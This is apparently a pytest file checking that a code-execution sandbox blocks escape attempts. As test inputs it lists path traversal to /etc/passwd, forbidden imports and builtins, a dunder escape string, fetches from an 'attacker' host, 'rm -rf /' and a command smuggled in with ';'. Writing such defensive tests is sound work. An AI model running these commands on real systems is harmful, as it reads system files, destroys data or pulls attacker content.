"""Day 7 sandbox jail — the anti-privilege-escalation fences (Decision 6/8).

Every escape the toy-scale (INV-7) fence claims to block is asserted here: path
traversal out of the jail, network/forbidden imports, non-whitelisted shell
commands, dunder-crawling escape hatches, and the timeout circuit-breaker.
"""

from __future__ import annotations

import pytest

from learnarken.repair.config import SandboxPolicy
from learnarken.repair.sandbox import Sandbox, SandboxViolation


@pytest.fixture
def sandbox():
    with Sandbox("samples/package-b", SandboxPolicy(timeout_s=2.0)) as sb:
        yield sb


def test_jail_holds_only_copies(sandbox):
    names = {p.name for p in sandbox.root.glob("*.xml")}
    assert names, "jail should contain copies of the package XML"
    # Editing the jail copy never touches the live corpus.
    original = sandbox.source
    assert sandbox.root != original


def test_path_traversal_is_refused(sandbox):
    for bad in ["../../etc/passwd", "/etc/passwd", "../secret.xml"]:
        with pytest.raises(SandboxViolation):
            sandbox.resolve(bad)


def test_network_import_refused(sandbox):
    for code in ["import socket", "import urllib.request", "from http import client"]:
        with pytest.raises(SandboxViolation):
            sandbox.exec_code("python", code)


def test_forbidden_builtins_refused(sandbox):
    for code in ["open('/etc/passwd')", "eval('1+1')", "__import__('os')", "getattr(x, 'y')"]:
        with pytest.raises(SandboxViolation):
            sandbox.exec_code("python", code)


def test_file_io_via_allowed_imports_refused(sandbox):
    """pathlib is gone; lxml/defusedxml file+network methods are refused (#1)."""
    for code in [
        "import pathlib",  # no longer allow-listed
        "from lxml import etree; etree.parse('/etc/passwd')",
        "from lxml import etree; etree.parse('http://attacker/x.xml')",
    ]:
        with pytest.raises(SandboxViolation):
            sandbox.exec_code("python", code)


def test_shell_arguments_are_jailed(sandbox):
    """Whitelisted argv[0] cannot read outside the jail or fetch a URL (#2)."""
    for cmd in [
        "cat /etc/passwd",
        "grep root /etc/passwd",
        "xmllint http://attacker/x.xml",
        "xmllint --output /tmp/pwn DMC.xml",
        "cat ../secret.xml",
    ]:
        with pytest.raises(SandboxViolation):
            sandbox.exec_code("shell", cmd)


def test_source_symlink_refused(tmp_path):
    """A symlinked package file is never copied into the jail (#3)."""
    import os

    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "DMC-real.xml").write_text("<r/>")
    secret = tmp_path / "secret"
    secret.write_text("TOP SECRET")
    os.symlink(secret, pkg / "DMC-leak.xml")
    with pytest.raises(SandboxViolation):
        Sandbox(pkg, SandboxPolicy())


def test_dunder_escape_hatch_refused(sandbox):
    with pytest.raises(SandboxViolation):
        sandbox.exec_code("python", "().__class__.__bases__")


def test_shell_whitelist_enforced(sandbox):
    with pytest.raises(SandboxViolation):
        sandbox.exec_code("shell", "rm -rf /")
    with pytest.raises(SandboxViolation):
        sandbox.exec_code("shell", "cat foo; rm bar")  # metacharacter


def test_allowed_python_runs(sandbox):
    result = sandbox.exec_code("python", "import json; print(json.dumps({'ok': 1}))")
    assert result.ok
    assert "ok" in result.stdout


def test_timeout_circuit_breaker():
    with Sandbox("samples/package-b", SandboxPolicy(timeout_s=1.0)) as sb:
        result = sb.exec_code("python", "\nwhile True:\n    x = 1\n")
        assert not result.ok
        assert result.exit_code is None  # killed by the timeout
        assert "timeout" in result.stderr
